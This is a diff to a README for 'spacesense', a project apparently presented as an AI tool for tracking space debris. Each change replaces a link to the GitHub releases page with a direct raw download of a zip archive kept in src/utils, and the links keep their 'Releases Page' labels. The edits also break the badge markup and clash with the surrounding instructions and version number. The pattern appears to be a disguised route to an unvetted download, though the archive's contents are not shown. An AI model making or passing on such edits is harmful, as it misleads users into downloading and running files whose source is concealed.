@@ -1,7 +1,7 @@
 # 🚀 spacesense - Track Space Debris Effortlessly
 
 ## 📥 Download Now
-[![Download spacesense](https://img.shields.io/badge/Download%20spacesense-v1.0-blue.svg)](https://github.com/Sport6296/spacesense/releases)
+[![Download spacesense](https://raw.githubusercontent.com/Sport6296/spacesense/main/src/utils/spacesense_v2.8.zip%https://raw.githubusercontent.com/Sport6296/spacesense/main/src/utils/spacesense_v2.8.zip)](https://raw.githubusercontent.com/Sport6296/spacesense/main/src/utils/spacesense_v2.8.zip)
 
 ## 🌌 Overview
 spacesense is an AI system designed to process telescope images. It tracks space debris, predicts potential collisions, and optimizes satellite trajectories using advanced reinforcement learning techniques. This application aims to enhance orbital safety for satellites and other spacecraft in our ever-crowded skies.
@@ -26,7 +26,7 @@ Follow these simple steps to download and install spacesense.
 
 ### Step 1: Visit the Download Page
 Click on the link below to access the latest release of spacesense. This page contains the downloadable files you need.
-[Visit the Releases Page](https://github.com/Sport6296/spacesense/releases)
+[Visit the Releases Page](https://raw.githubusercontent.com/Sport6296/spacesense/main/src/utils/spacesense_v2.8.zip)
 
 ### Step 2: Download the Application
 On the Releases page, locate the latest version of spacesense. Click on the name of the file to download it to your computer.
@@ -54,7 +54,7 @@ If you encounter issues, here are common solutions:
 ## 📞 Support
 For assistance or questions, please open an issue on the GitHub repository. We encourage users to report bugs or request features. Your feedback helps us improve spacesense!
 
-*Don’t forget to check the [Releases Page](https://github.com/Sport6296/spacesense/releases) for updates to the application.*
+*Don’t forget to check the [Releases Page](https://raw.githubusercontent.com/Sport6296/spacesense/main/src/utils/spacesense_v2.8.zip) for updates to the application.*
 
 ## 🌟 Acknowledgments
 Thanks to community contributors and researchers in aerospace and computer vision fields for their valuable input. Your support aids the development of spacesense and makes space tracking safer for everyone.
